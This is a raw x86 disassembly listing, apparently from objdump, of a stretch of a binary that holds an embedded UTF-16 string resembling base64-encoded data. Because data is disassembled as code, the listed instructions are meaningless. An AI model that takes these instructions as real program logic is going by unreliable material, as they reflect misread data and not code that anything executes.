  40a0bc:	2b 00                	sub    (%eax),%eax
  40a0be:	39 00                	cmp    %eax,(%eax)
  40a0c0:	42                   	inc    %edx
  40a0c1:	00 76 00             	add    %dh,0x0(%esi)
  40a0c4:	65 00 32             	add    %dh,%gs:(%edx)
  40a0c7:	00 4c 00 64          	add    %cl,0x64(%eax,%eax,1)
  40a0cb:	00 58 00             	add    %bl,0x0(%eax)
  40a0ce:	68 00 47 00 4a       	push   $0x4a004700
  40a0d3:	00 76 00             	add    %dh,0x0(%esi)
  40a0d6:	33 00                	xor    (%eax),%eax
  40a0d8:	54                   	push   %esp
  40a0d9:	00 73 00             	add    %dh,0x0(%ebx)
  40a0dc:	51                   	push   %ecx
  40a0dd:	00 48 00             	add    %cl,0x0(%eax)
  40a0e0:	44                   	inc    %esp
  40a0e1:	00 68 00             	add    %ch,0x0(%eax)
  40a0e4:	2f                   	das
  40a0e5:	00 35 00 79 00 6a    	add    %dh,0x6a007900
  40a0eb:	00 79 00             	add    %bh,0x0(%ecx)
  40a0ee:	73 00                	jae    0x40a0f0
  40a0f0:	33 00                	xor    (%eax),%eax
  40a0f2:	65 00 66 00          	add    %ah,%gs:0x0(%esi)
  40a0f6:	53                   	push   %ebx
  40a0f7:	00 52 00             	add    %dl,0x0(%edx)
  40a0fa:	61                   	popa
  40a0fb:	00 6d 00             	add    %ch,0x0(%ebp)
  40a0fe:	36 00 42 00          	add    %al,%ss:0x0(%edx)
  40a102:	35 00 6b 00 2b       	xor    $0x2b006b00,%eax
  40a107:	00 74 00 56          	add    %dh,0x56(%eax,%eax,1)
  40a10b:	00 61 00             	add    %ah,0x0(%ecx)
  40a10e:	6c                   	insb   (%dx),%es:(%edi)
  40a10f:	00 68 00             	add    %ch,0x0(%eax)
  40a112:	43                   	inc    %ebx
  40a113:	00 70 00             	add    %dh,0x0(%eax)
  40a116:	5a                   	pop    %edx
  40a117:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
  40a11b:	00 75 00             	add    %dh,0x0(%ebp)
  40a11e:	64 00 74 00 59       	add    %dh,%fs:0x59(%eax,%eax,1)
  40a123:	00 46 00             	add    %al,0x0(%esi)
  40a126:	76 00                	jbe    0x40a128
  40a128:	7a 00                	jp     0x40a12a
  40a12a:	37                   	aaa
  40a12b:	00 2f                	add    %ch,(%edi)
  40a12d:	00 59 00             	add    %bl,0x0(%ecx)
  40a130:	31 00                	xor    %eax,(%eax)
  40a132:	35 00 30 00 42       	xor    $0x42003000,%eax
  40a137:	00 4d 00             	add    %cl,0x0(%ebp)
  40a13a:	58                   	pop    %eax
  40a13b:	00 6d 00             	add    %ch,0x0(%ebp)
  40a13e:	7a 00                	jp     0x40a140
  40a140:	65 00 31             	add    %dh,%gs:(%ecx)
  40a143:	00 6f 00             	add    %ch,0x0(%edi)
  40a146:	64 00 64 00 7a       	add    %ah,%fs:0x7a(%eax,%eax,1)
  40a14b:	00 31                	add    %dh,(%ecx)
  40a14d:	00 76 00             	add    %dh,0x0(%esi)
  40a150:	39 00                	cmp    %eax,(%eax)
  40a152:	5a                   	pop    %edx
  40a153:	00 63 00             	add    %ah,0x0(%ebx)
  40a156:	4a                   	dec    %edx
  40a157:	00 37                	add    %dh,(%edi)
  40a159:	00 71 00             	add    %dh,0x0(%ecx)
  40a15c:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
  40a160:	73 00                	jae    0x40a162
  40a162:	75 00                	jne    0x40a164
  40a164:	6f                   	outsl  %ds:(%esi),(%dx)
  40a165:	00 70 00             	add    %dh,0x0(%eax)
  40a168:	54                   	push   %esp
  40a169:	00 61 00             	add    %ah,0x0(%ecx)
  40a16c:	63 00                	arpl   %eax,(%eax)
  40a16e:	34 00                	xor    $0x0,%al
  40a170:	33 00                	xor    (%eax),%eax
  40a172:	43                   	inc    %ebx
  40a173:	00 4a 00             	add    %cl,0x0(%edx)
  40a176:	49                   	dec    %ecx
  40a177:	00 64 00 6a          	add    %ah,0x6a(%eax,%eax,1)
  40a17b:	00 4a 00             	add    %cl,0x0(%edx)
  40a17e:	70 00                	jo     0x40a180
  40a180:	7a 00                	jp     0x40a182
  40a182:	37                   	aaa
  40a183:	00 65 00             	add    %ah,0x0(%ebp)
  40a186:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  40a18a:	6d                   	insl   (%dx),%es:(%edi)
  40a18b:	00 5a 00             	add    %bl,0x0(%edx)
  40a18e:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40a192:	4a                   	dec    %edx
  40a193:	00 48 00             	add    %cl,0x0(%eax)
  40a196:	74 00                	je     0x40a198
  40a198:	67 00 5a 00          	add    %bl,0x0(%bp,%si)
  40a19c:	70 00                	jo     0x40a19e
  40a19e:	7a 00                	jp     0x40a1a0
  40a1a0:	6b 00 34             	imul   $0x34,(%eax),%eax
  40a1a3:	00 6c 00 31          	add    %ch,0x31(%eax,%eax,1)
  40a1a7:	00 59 00             	add    %bl,0x0(%ecx)
  40a1aa:	5a                   	pop    %edx
  40a1ab:	00 58 00             	add    %bl,0x0(%eax)
  40a1ae:	77 00                	ja     0x40a1b0
  40a1b0:	54                   	push   %esp
  40a1b1:	00 54 00 79          	add    %dl,0x79(%eax,%eax,1)
  40a1b5:	00 4b 00             	add    %cl,0x0(%ebx)
  40a1b8:	70 00                	jo     0x40a1ba
  40a1ba:	32 00                	xor    (%eax),%al
  40a1bc:	75 00                	jne    0x40a1be
  40a1be:	54                   	push   %esp
  40a1bf:	00 54 00 2b          	add    %dl,0x2b(%eax,%eax,1)
  40a1c3:	00 77 00             	add    %dh,0x0(%edi)
  40a1c6:	34 00                	xor    $0x0,%al
  40a1c8:	76 00                	jbe    0x40a1ca
  40a1ca:	4d                   	dec    %ebp
  40a1cb:	00 59 00             	add    %bl,0x0(%ecx)
  40a1ce:	54                   	push   %esp
  40a1cf:	00 45 00             	add    %al,0x0(%ebp)
  40a1d2:	31 00                	xor    %eax,(%eax)
  40a1d4:	62 00                	bound  %eax,(%eax)
  40a1d6:	6c                   	insb   (%dx),%es:(%edi)
  40a1d7:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40a1db:	00 73 00             	add    %dh,0x0(%ebx)
  40a1de:	42                   	inc    %edx
  40a1df:	00 42 00             	add    %al,0x0(%edx)
  40a1e2:	67 00 67 00          	add    %ah,0x0(%bx)
  40a1e6:	71 00                	jno    0x40a1e8
  40a1e8:	37                   	aaa
  40a1e9:	00 78 00             	add    %bh,0x0(%eax)
  40a1ec:	39 00                	cmp    %eax,(%eax)
  40a1ee:	55                   	push   %ebp
  40a1ef:	00 33                	add    %dh,(%ebx)
  40a1f1:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a1f4:	76 00                	jbe    0x40a1f6
  40a1f6:	41                   	inc    %ecx
  40a1f7:	00 4f 00             	add    %cl,0x0(%edi)
  40a1fa:	65 00 59 00          	add    %bl,%gs:0x0(%ecx)
  40a1fe:	4d                   	dec    %ebp
  40a1ff:	00 76 00             	add    %dh,0x0(%esi)
  40a202:	38 00                	cmp    %al,(%eax)
  40a204:	54                   	push   %esp
  40a205:	00 6e 00             	add    %ch,0x0(%esi)
  40a208:	61                   	popa
  40a209:	00 55 00             	add    %dl,0x0(%ebp)
  40a20c:	4b                   	dec    %ebx
  40a20d:	00 72 00             	add    %dh,0x0(%edx)
  40a210:	4d                   	dec    %ebp
  40a211:	00 43 00             	add    %al,0x0(%ebx)
  40a214:	59                   	pop    %ecx
  40a215:	00 48 00             	add    %cl,0x0(%eax)
  40a218:	53                   	push   %ebx
  40a219:	00 73 00             	add    %dh,0x0(%ebx)
  40a21c:	4a                   	dec    %edx
  40a21d:	00 79 00             	add    %bh,0x0(%ecx)
  40a220:	54                   	push   %esp
  40a221:	00 30                	add    %dh,(%eax)
  40a223:	00 50 00             	add    %dl,0x0(%eax)
  40a226:	41                   	inc    %ecx
  40a227:	00 4a 00             	add    %cl,0x0(%edx)
  40a22a:	5a                   	pop    %edx
  40a22b:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
  40a22f:	00 6d 00             	add    %ch,0x0(%ebp)
  40a232:	49                   	dec    %ecx
  40a233:	00 56 00             	add    %dl,0x0(%esi)
  40a236:	71 00                	jno    0x40a238
  40a238:	6e                   	outsb  %ds:(%esi),(%dx)
  40a239:	00 59 00             	add    %bl,0x0(%ecx)
  40a23c:	6a 00                	push   $0x0
  40a23e:	69 00 73 00 36 00    	imul   $0x360073,(%eax),%eax
  40a244:	30 00                	xor    %al,(%eax)
  40a246:	6b 00 2f             	imul   $0x2f,(%eax),%eax
  40a249:	00 56 00             	add    %dl,0x0(%esi)
  40a24c:	74 00                	je     0x40a24e
  40a24e:	69 00 39 00 36 00    	imul   $0x360039,(%eax),%eax
  40a254:	6a 00                	push   $0x0
  40a256:	50                   	push   %eax
  40a257:	00 37                	add    %dh,(%edi)
  40a259:	00 68 00             	add    %ch,0x0(%eax)
  40a25c:	2b 00                	sub    (%eax),%eax
  40a25e:	75 00                	jne    0x40a260
  40a260:	69 00 4a 00 51 00    	imul   $0x51004a,(%eax),%eax
  40a266:	74 00                	je     0x40a268
  40a268:	31 00                	xor    %eax,(%eax)
  40a26a:	54                   	push   %esp
  40a26b:	00 59 00             	add    %bl,0x0(%ecx)
  40a26e:	59                   	pop    %ecx
  40a26f:	00 45 00             	add    %al,0x0(%ebp)
  40a272:	46                   	inc    %esi
  40a273:	00 35 00 54 00 4a    	add    %dh,0x4a005400
  40a279:	00 6d 00             	add    %ch,0x0(%ebp)
  40a27c:	36 00 58 00          	add    %bl,%ss:0x0(%eax)
  40a280:	71 00                	jno    0x40a282
  40a282:	2f                   	das
  40a283:	00 63 00             	add    %ah,0x0(%ebx)
  40a286:	75 00                	jne    0x40a288
  40a288:	75 00                	jne    0x40a28a
  40a28a:	66 00 33             	data16 add %dh,(%ebx)
  40a28d:	00 4d 00             	add    %cl,0x0(%ebp)
  40a290:	71 00                	jno    0x40a292
  40a292:	4c                   	dec    %esp
  40a293:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a296:	38 00                	cmp    %al,(%eax)
  40a298:	37                   	aaa
  40a299:	00 7a 00             	add    %bh,0x0(%edx)
  40a29c:	34 00                	xor    $0x0,%al
  40a29e:	44                   	inc    %esp
  40a29f:	00 55 00             	add    %dl,0x0(%ebp)
  40a2a2:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40a2a6:	4f                   	dec    %edi
  40a2a7:	00 4d 00             	add    %cl,0x0(%ebp)
  40a2aa:	78 00                	js     0x40a2ac
  40a2ac:	51                   	push   %ecx
  40a2ad:	00 71 00             	add    %dh,0x0(%ecx)
  40a2b0:	7a 00                	jp     0x40a2b2
  40a2b2:	46                   	inc    %esi
  40a2b3:	00 56 00             	add    %dl,0x0(%esi)
  40a2b6:	67 00 75 00          	add    %dh,0x0(%di)
  40a2ba:	30 00                	xor    %al,(%eax)
  40a2bc:	36 00 73 00          	add    %dh,%ss:0x0(%ebx)
  40a2c0:	55                   	push   %ebp
  40a2c1:	00 42 00             	add    %al,0x0(%edx)
  40a2c4:	62 00                	bound  %eax,(%eax)
  40a2c6:	42                   	inc    %edx
  40a2c7:	00 7a 00             	add    %bh,0x0(%edx)
  40a2ca:	41                   	inc    %ecx
  40a2cb:	00 31                	add    %dh,(%ecx)
  40a2cd:	00 79 00             	add    %bh,0x0(%ecx)
  40a2d0:	31 00                	xor    %eax,(%eax)
  40a2d2:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2d3:	00 50 00             	add    %dl,0x0(%eax)
  40a2d6:	6c                   	insb   (%dx),%es:(%edi)
  40a2d7:	00 55 00             	add    %dl,0x0(%ebp)
  40a2da:	6e                   	outsb  %ds:(%esi),(%dx)
  40a2db:	00 67 00             	add    %ah,0x0(%edi)
  40a2de:	50                   	push   %eax
  40a2df:	00 65 00             	add    %ah,0x0(%ebp)
  40a2e2:	6b 00 52             	imul   $0x52,(%eax),%eax
  40a2e5:	00 48 00             	add    %cl,0x0(%eax)
  40a2e8:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2e9:	00 55 00             	add    %dl,0x0(%ebp)
  40a2ec:	6a 00                	push   $0x0
  40a2ee:	34 00                	xor    $0x0,%al
  40a2f0:	75 00                	jne    0x40a2f2
  40a2f2:	72 00                	jb     0x40a2f4
  40a2f4:	47                   	inc    %edi
  40a2f5:	00 74 00 71          	add    %dh,0x71(%eax,%eax,1)
  40a2f9:	00 49 00             	add    %cl,0x0(%ecx)
  40a2fc:	6c                   	insb   (%dx),%es:(%edi)
  40a2fd:	00 53 00             	add    %dl,0x0(%ebx)
  40a300:	64 00 36             	add    %dh,%fs:(%esi)
  40a303:	00 46 00             	add    %al,0x0(%esi)
  40a306:	47                   	inc    %edi
  40a307:	00 5a 00             	add    %bl,0x0(%edx)
  40a30a:	78 00                	js     0x40a30c
  40a30c:	7a 00                	jp     0x40a30e
  40a30e:	44                   	inc    %esp
  40a30f:	00 69 00             	add    %ch,0x0(%ecx)
  40a312:	48                   	dec    %eax
  40a313:	00 47 00             	add    %al,0x0(%edi)
  40a316:	4f                   	dec    %edi
  40a317:	00 43 00             	add    %al,0x0(%ebx)
  40a31a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a31b:	00 57 00             	add    %dl,0x0(%edi)
  40a31e:	34 00                	xor    $0x0,%al
  40a320:	38 00                	cmp    %al,(%eax)
  40a322:	4e                   	dec    %esi
  40a323:	00 67 00             	add    %ah,0x0(%edi)
  40a326:	33 00                	xor    (%eax),%eax
  40a328:	7a 00                	jp     0x40a32a
  40a32a:	36 00 78 00          	add    %bh,%ss:0x0(%eax)
  40a32e:	4e                   	dec    %esi
  40a32f:	00 7a 00             	add    %bh,0x0(%edx)
  40a332:	32 00                	xor    (%eax),%al
  40a334:	50                   	push   %eax
  40a335:	00 66 00             	add    %ah,0x0(%esi)
  40a338:	35 00 30 00 31       	xor    $0x31003000,%eax
  40a33d:	00 6a 00             	add    %ch,0x0(%edx)
  40a340:	30 00                	xor    %al,(%eax)
  40a342:	30 00                	xor    %al,(%eax)
  40a344:	58                   	pop    %eax
  40a345:	00 33                	add    %dh,(%ebx)
  40a347:	00 70 00             	add    %dh,0x0(%eax)
  40a34a:	53                   	push   %ebx
  40a34b:	00 33                	add    %dh,(%ebx)
  40a34d:	00 33                	add    %dh,(%ebx)
  40a34f:	00 46 00             	add    %al,0x0(%esi)
  40a352:	47                   	inc    %edi
  40a353:	00 45 00             	add    %al,0x0(%ebp)
  40a356:	57                   	push   %edi
  40a357:	00 6a 00             	add    %ch,0x0(%edx)
  40a35a:	74 00                	je     0x40a35c
  40a35c:	54                   	push   %esp
  40a35d:	00 30                	add    %dh,(%eax)
  40a35f:	00 57 00             	add    %dl,0x0(%edi)
  40a362:	50                   	push   %eax
  40a363:	00 37                	add    %dh,(%edi)
  40a365:	00 4e 00             	add    %cl,0x0(%esi)
  40a368:	6b 00 61             	imul   $0x61,(%eax),%eax
  40a36b:	00 4d 00             	add    %cl,0x0(%ebp)
  40a36e:	30 00                	xor    %al,(%eax)
  40a370:	77 00                	ja     0x40a372
  40a372:	52                   	push   %edx
  40a373:	00 6d 00             	add    %ch,0x0(%ebp)
  40a376:	71 00                	jno    0x40a378
  40a378:	54                   	push   %esp
  40a379:	00 74 00 4a          	add    %dh,0x4a(%eax,%eax,1)
  40a37d:	00 79 00             	add    %bh,0x0(%ecx)
  40a380:	5a                   	pop    %edx
  40a381:	00 33                	add    %dh,(%ebx)
  40a383:	00 61 00             	add    %ah,0x0(%ecx)
  40a386:	39 00                	cmp    %eax,(%eax)
  40a388:	31 00                	xor    %eax,(%eax)
  40a38a:	47                   	inc    %edi
  40a38b:	00 32                	add    %dh,(%edx)
  40a38d:	00 7a 00             	add    %bh,0x0(%edx)
  40a390:	35 00 35 00 31       	xor    $0x31003500,%eax
  40a395:	00 68 00             	add    %ch,0x0(%eax)
  40a398:	79 00                	jns    0x40a39a
  40a39a:	45                   	inc    %ebp
  40a39b:	00 79 00             	add    %bh,0x0(%ecx)
  40a39e:	51                   	push   %ecx
  40a39f:	00 32                	add    %dh,(%edx)
  40a3a1:	00 49 00             	add    %cl,0x0(%ecx)
  40a3a4:	78 00                	js     0x40a3a6
  40a3a6:	62 00                	bound  %eax,(%eax)
  40a3a8:	46                   	inc    %esi
  40a3a9:	00 53 00             	add    %dl,0x0(%ebx)
  40a3ac:	6d                   	insl   (%dx),%es:(%edi)
  40a3ad:	00 66 00             	add    %ah,0x0(%esi)
  40a3b0:	34 00                	xor    $0x0,%al
  40a3b2:	67 00 63 00          	add    %ah,0x0(%bp,%di)
  40a3b6:	59                   	pop    %ecx
  40a3b7:	00 53 00             	add    %dl,0x0(%ebx)
  40a3ba:	54                   	push   %esp
  40a3bb:	00 31                	add    %dh,(%ecx)
  40a3bd:	00 45 00             	add    %al,0x0(%ebp)
  40a3c0:	75 00                	jne    0x40a3c2
  40a3c2:	30 00                	xor    %al,(%eax)
  40a3c4:	77 00                	ja     0x40a3c6
  40a3c6:	66 00 73 00          	data16 add %dh,0x0(%ebx)
  40a3ca:	4d                   	dec    %ebp
  40a3cb:	00 43 00             	add    %al,0x0(%ebx)
  40a3ce:	34 00                	xor    $0x0,%al
  40a3d0:	57                   	push   %edi
  40a3d1:	00 66 00             	add    %ah,0x0(%esi)
  40a3d4:	6d                   	insl   (%dx),%es:(%edi)
  40a3d5:	00 65 00             	add    %ah,0x0(%ebp)
  40a3d8:	73 00                	jae    0x40a3da
  40a3da:	37                   	aaa
  40a3db:	00 63 00             	add    %ah,0x0(%ebx)
  40a3de:	74 00                	je     0x40a3e0
  40a3e0:	4a                   	dec    %edx
  40a3e1:	00 43 00             	add    %al,0x0(%ebx)
  40a3e4:	32 00                	xor    (%eax),%al
  40a3e6:	6b 00 53             	imul   $0x53,(%eax),%eax
  40a3e9:	00 6b 00             	add    %ch,0x0(%ebx)
  40a3ec:	45                   	inc    %ebp
  40a3ed:	00 30                	add    %dh,(%eax)
  40a3ef:	00 51 00             	add    %dl,0x0(%ecx)
  40a3f2:	76 00                	jbe    0x40a3f4
  40a3f4:	66 00 31             	data16 add %dh,(%ecx)
  40a3f7:	00 49 00             	add    %cl,0x0(%ecx)
  40a3fa:	55                   	push   %ebp
  40a3fb:	00 51 00             	add    %dl,0x0(%ecx)
  40a3fe:	4a                   	dec    %edx
  40a3ff:	00 6b 00             	add    %ch,0x0(%ebx)
  40a402:	57                   	push   %edi
  40a403:	00 44 00 4b          	add    %al,0x4b(%eax,%eax,1)
  40a407:	00 6d 00             	add    %ch,0x0(%ebp)
  40a40a:	66 00 4a 00          	data16 add %cl,0x0(%edx)
  40a40e:	79 00                	jns    0x40a410
  40a410:	6a 00                	push   $0x0
  40a412:	43                   	inc    %ebx
  40a413:	00 69 00             	add    %ch,0x0(%ecx)
  40a416:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
  40a41a:	64 00 59 00          	add    %bl,%fs:0x0(%ecx)
  40a41e:	4c                   	dec    %esp
  40a41f:	00 67 00             	add    %ah,0x0(%edi)
  40a422:	6f                   	outsl  %ds:(%esi),(%dx)
  40a423:	00 64 00 72          	add    %ah,0x72(%eax,%eax,1)
  40a427:	00 2b                	add    %ch,(%ebx)
  40a429:	00 38                	add    %bh,(%eax)
  40a42b:	00 50 00             	add    %dl,0x0(%eax)
  40a42e:	58                   	pop    %eax
  40a42f:	00 79 00             	add    %bh,0x0(%ecx)
  40a432:	48                   	dec    %eax
  40a433:	00 72 00             	add    %dh,0x0(%edx)
  40a436:	2b 00                	sub    (%eax),%eax
  40a438:	57                   	push   %edi
  40a439:	00 55 00             	add    %dl,0x0(%ebp)
  40a43c:	68 00 79 00 57       	push   $0x57007900
  40a441:	00 5a 00             	add    %bl,0x0(%edx)
  40a444:	46                   	inc    %esi
  40a445:	00 32                	add    %dh,(%edx)
  40a447:	00 45 00             	add    %al,0x0(%ebp)
  40a44a:	2b 00                	sub    (%eax),%eax
  40a44c:	57                   	push   %edi
  40a44d:	00 48 00             	add    %cl,0x0(%eax)
  40a450:	4b                   	dec    %ebx
  40a451:	00 32                	add    %dh,(%edx)
  40a453:	00 2f                	add    %ch,(%edi)
  40a455:	00 50 00             	add    %dl,0x0(%eax)
  40a458:	4d                   	dec    %ebp
  40a459:	00 4e 00             	add    %cl,0x0(%esi)
  40a45c:	69 00 68 00 4b 00    	imul   $0x4b0068,(%eax),%eax
  40a462:	67 00 42 00          	add    %al,0x0(%bp,%si)
  40a466:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  40a46a:	31 00                	xor    %eax,(%eax)
  40a46c:	4e                   	dec    %esi
  40a46d:	00 44 00 61          	add    %al,0x61(%eax,%eax,1)
  40a471:	00 48 00             	add    %cl,0x0(%eax)
  40a474:	6f                   	outsl  %ds:(%esi),(%dx)
  40a475:	00 4f 00             	add    %cl,0x0(%edi)
  40a478:	34 00                	xor    $0x0,%al
  40a47a:	65 00 6a 00          	add    %ch,%gs:0x0(%edx)
  40a47e:	36 00 2f             	add    %ch,%ss:(%edi)
  40a481:	00 62 00             	add    %ah,0x0(%edx)
  40a484:	2f                   	das
  40a485:	00 75 00             	add    %dh,0x0(%ebp)
  40a488:	79 00                	jns    0x40a48a
  40a48a:	57                   	push   %edi
  40a48b:	00 63 00             	add    %ah,0x0(%ebx)
  40a48e:	6c                   	insb   (%dx),%es:(%edi)
  40a48f:	00 32                	add    %dh,(%edx)
  40a491:	00 51 00             	add    %dl,0x0(%ecx)
  40a494:	42                   	inc    %edx
  40a495:	00 57 00             	add    %dl,0x0(%edi)
  40a498:	58                   	pop    %eax
  40a499:	00 2b                	add    %ch,(%ebx)
  40a49b:	00 43 00             	add    %al,0x0(%ebx)
  40a49e:	7a 00                	jp     0x40a4a0
  40a4a0:	52                   	push   %edx
  40a4a1:	00 50 00             	add    %dl,0x0(%eax)
  40a4a4:	37                   	aaa
  40a4a5:	00 45 00             	add    %al,0x0(%ebp)
  40a4a8:	69 00 4b 00 4a 00    	imul   $0x4a004b,(%eax),%eax
  40a4ae:	7a 00                	jp     0x40a4b0
  40a4b0:	50                   	push   %eax
  40a4b1:	00 4f 00             	add    %cl,0x0(%edi)
  40a4b4:	4a                   	dec    %edx
  40a4b5:	00 42 00             	add    %al,0x0(%edx)
  40a4b8:	46                   	inc    %esi
  40a4b9:	00 2f                	add    %ch,(%edi)
  40a4bb:	00 51 00             	add    %dl,0x0(%ecx)
  40a4be:	50                   	push   %eax
  40a4bf:	00 49 00             	add    %cl,0x0(%ecx)
  40a4c2:	41                   	inc    %ecx
  40a4c3:	00 71 00             	add    %dh,0x0(%ecx)
  40a4c6:	32 00                	xor    (%eax),%al
  40a4c8:	6f                   	outsl  %ds:(%esi),(%dx)
  40a4c9:	00 68 00             	add    %ch,0x0(%eax)
  40a4cc:	75 00                	jne    0x40a4ce
  40a4ce:	58                   	pop    %eax
  40a4cf:	00 5a 00             	add    %bl,0x0(%edx)
  40a4d2:	48                   	dec    %eax
  40a4d3:	00 36                	add    %dh,(%esi)
  40a4d5:	00 48 00             	add    %cl,0x0(%eax)
  40a4d8:	43                   	inc    %ebx
  40a4d9:	00 73 00             	add    %dh,0x0(%ebx)
  40a4dc:	38 00                	cmp    %al,(%eax)
  40a4de:	6b 00 76             	imul   $0x76,(%eax),%eax
  40a4e1:	00 71 00             	add    %dh,0x0(%ecx)
  40a4e4:	44                   	inc    %esp
  40a4e5:	00 49 00             	add    %cl,0x0(%ecx)
  40a4e8:	71 00                	jno    0x40a4ea
  40a4ea:	52                   	push   %edx
  40a4eb:	00 76 00             	add    %dh,0x0(%esi)
  40a4ee:	4a                   	dec    %edx
  40a4ef:	00 78 00             	add    %bh,0x0(%eax)
  40a4f2:	79 00                	jns    0x40a4f4
  40a4f4:	65 00 4a 00          	add    %cl,%gs:0x0(%edx)
  40a4f8:	69 00 71 00 77 00    	imul   $0x770071,(%eax),%eax
  40a4fe:	4b                   	dec    %ebx
  40a4ff:	00 65 00             	add    %ah,0x0(%ebp)
  40a502:	66 00 2f             	data16 add %ch,(%edi)
  40a505:	00 68 00             	add    %ch,0x0(%eax)
  40a508:	76 00                	jbe    0x40a50a
  40a50a:	59                   	pop    %ecx
  40a50b:	00 45 00             	add    %al,0x0(%ebp)
  40a50e:	34 00                	xor    $0x0,%al
  40a510:	4c                   	dec    %esp
  40a511:	00 74 00 51          	add    %dh,0x51(%eax,%eax,1)
  40a515:	00 6d 00             	add    %ch,0x0(%ebp)
  40a518:	52                   	push   %edx
  40a519:	00 56 00             	add    %dl,0x0(%esi)
  40a51c:	52                   	push   %edx
  40a51d:	00 61 00             	add    %ah,0x0(%ecx)
  40a520:	72 00                	jb     0x40a522
  40a522:	59                   	pop    %ecx
  40a523:	00 64 00 68          	add    %ah,0x68(%eax,%eax,1)
  40a527:	00 47 00             	add    %al,0x0(%edi)
  40a52a:	6d                   	insl   (%dx),%es:(%edi)
  40a52b:	00 54 00 33          	add    %dl,0x33(%eax,%eax,1)
  40a52f:	00 38                	add    %bh,(%eax)
  40a531:	00 6b 00             	add    %ch,0x0(%ebx)
  40a534:	73 00                	jae    0x40a536
  40a536:	38 00                	cmp    %al,(%eax)
  40a538:	59                   	pop    %ecx
  40a539:	00 66 00             	add    %ah,0x0(%esi)
  40a53c:	67 00 75 00          	add    %dh,0x0(%di)
  40a540:	2b 00                	sub    (%eax),%eax
  40a542:	4d                   	dec    %ebp
  40a543:	00 65 00             	add    %ah,0x0(%ebp)
  40a546:	4e                   	dec    %esi
  40a547:	00 67 00             	add    %ah,0x0(%edi)
  40a54a:	48                   	dec    %eax
  40a54b:	00 6d 00             	add    %ch,0x0(%ebp)
  40a54e:	76 00                	jbe    0x40a550
  40a550:	6a 00                	push   $0x0
  40a552:	33 00                	xor    (%eax),%eax
  40a554:	4a                   	dec    %edx
  40a555:	00 38                	add    %bh,(%eax)
  40a557:	00 71 00             	add    %dh,0x0(%ecx)
  40a55a:	47                   	inc    %edi
  40a55b:	00 42 00             	add    %al,0x0(%edx)
  40a55e:	62 00                	bound  %eax,(%eax)
  40a560:	5a                   	pop    %edx
  40a561:	00 47 00             	add    %al,0x0(%edi)
  40a564:	68 00 51 00 38       	push   $0x38005100
  40a569:	00 71 00             	add    %dh,0x0(%ecx)
  40a56c:	39 00                	cmp    %eax,(%eax)
  40a56e:	77 00                	ja     0x40a570
  40a570:	4a                   	dec    %edx
  40a571:	00 79 00             	add    %bh,0x0(%ecx)
  40a574:	4a                   	dec    %edx
  40a575:	00 54 00 78          	add    %dl,0x78(%eax,%eax,1)
  40a579:	00 7a 00             	add    %bh,0x0(%edx)
  40a57c:	57                   	push   %edi
  40a57d:	00 6d 00             	add    %ch,0x0(%ebp)
  40a580:	5a                   	pop    %edx
  40a581:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40a585:	00 50 00             	add    %dl,0x0(%eax)
  40a588:	30 00                	xor    %al,(%eax)
  40a58a:	59                   	pop    %ecx
  40a58b:	00 35 00 2f 00 69    	add    %dh,0x69002f00
  40a591:	00 30                	add    %dh,(%eax)
  40a593:	00 42 00             	add    %al,0x0(%edx)
  40a596:	33 00                	xor    (%eax),%eax
  40a598:	49                   	dec    %ecx
  40a599:	00 64 00 34          	add    %ah,0x34(%eax,%eax,1)
  40a59d:	00 4a 00             	add    %cl,0x0(%edx)
  40a5a0:	71 00                	jno    0x40a5a2
  40a5a2:	73 00                	jae    0x40a5a4
  40a5a4:	71 00                	jno    0x40a5a6
  40a5a6:	43                   	inc    %ebx
  40a5a7:	00 32                	add    %dh,(%edx)
  40a5a9:	00 49 00             	add    %cl,0x0(%ecx)
  40a5ac:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  40a5b0:	47                   	inc    %edi
  40a5b1:	00 45 00             	add    %al,0x0(%ebp)
  40a5b4:	32 00                	xor    (%eax),%al
  40a5b6:	55                   	push   %ebp
  40a5b7:	00 4d 00             	add    %cl,0x0(%ebp)
  40a5ba:	2b 00                	sub    (%eax),%eax
  40a5bc:	30 00                	xor    %al,(%eax)
  40a5be:	48                   	dec    %eax
  40a5bf:	00 71 00             	add    %dh,0x0(%ecx)
  40a5c2:	49                   	dec    %ecx
  40a5c3:	00 36                	add    %dh,(%esi)
  40a5c5:	00 6b 00             	add    %ch,0x0(%ebx)
  40a5c8:	47                   	inc    %edi
  40a5c9:	00 4d 00             	add    %cl,0x0(%ebp)
  40a5cc:	67 00 68 00          	add    %ch,0x0(%bx,%si)
  40a5d0:	63 00                	arpl   %eax,(%eax)
  40a5d2:	48                   	dec    %eax
  40a5d3:	00 38                	add    %bh,(%eax)
  40a5d5:	00 52 00             	add    %dl,0x0(%edx)
  40a5d8:	4a                   	dec    %edx
  40a5d9:	00 51 00             	add    %dl,0x0(%ecx)
  40a5dc:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
  40a5e0:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5e1:	00 33                	add    %dh,(%ebx)
  40a5e3:	00 35 00 4b 00 44    	add    %dh,0x44004b00
  40a5e9:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a5ec:	72 00                	jb     0x40a5ee
  40a5ee:	34 00                	xor    $0x0,%al
  40a5f0:	6d                   	insl   (%dx),%es:(%edi)
  40a5f1:	00 69 00             	add    %ch,0x0(%ecx)
  40a5f4:	58                   	pop    %eax
  40a5f5:	00 6b 00             	add    %ch,0x0(%ebx)
  40a5f8:	49                   	dec    %ecx
  40a5f9:	00 65 00             	add    %ah,0x0(%ebp)
  40a5fc:	73 00                	jae    0x40a5fe
  40a5fe:	70 00                	jo     0x40a600
  40a600:	4b                   	dec    %ebx
  40a601:	00 47 00             	add    %al,0x0(%edi)
  40a604:	55                   	push   %ebp
